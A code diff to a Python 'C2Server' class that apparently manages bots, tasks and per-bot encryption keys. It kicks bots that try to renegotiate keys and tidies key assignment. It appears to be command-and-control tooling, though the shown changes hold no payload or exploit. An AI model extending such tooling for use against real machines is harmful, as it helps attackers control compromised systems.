@@ -37,7 +37,7 @@ class C2Server(QBalancedServer):
         if event_type == "task":
             state = message.get("state")
             task_id = message.get("task_id")
-            task = bot.getTaskById(task_id)
+            task = bot.get_task_by_id(task_id)
             if task:
                 if state == "started":
                     task.set_running(datetime.datetime.now())
@@ -60,10 +60,15 @@ class C2Server(QBalancedServer):
         elif event_type == "assign":
             key = message.get("encryption_key")
             recv_id = message.get("bot_id")
+            if bot.is_connected():
+                self.logger.warning("Bot {} tried to renegotiate encryption key. Kicked!".format(bot_id))
+                self.kick(bot_id)
+
             if key and int(bot_id) == recv_id:
                 if key == bot.key:
                     key = str(key).encode()
                     self.setCustomKeyForClient(bot_id, key)
+                    bot.set_connected(True)
                     self.assigned.emit(bot_id, bot.ip, bot.port)
                 else:
                     self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
@@ -76,6 +81,7 @@ class C2Server(QBalancedServer):
     @Slot(int, str, int)
     def pre_connection(self, bot_id, ip, port):
         key = generate_key().decode()
+        self.getDeviceById(bot_id).set_custom_key(key)
         self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": key})
 
     @Slot(int, str, dict, int)
@@ -115,10 +121,6 @@ class C2Server(QBalancedServer):
             self.writeAll(info_obj.serialize())
         else:
             self.write(bot_id, info_obj.serialize())
-
-    @Slot(int)
-    def send_assign_message(self, bot_id):
-        self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": generate_key().decode()})
 
     @Slot(int, int)
     def stop_task(self, bot_id, task_id):
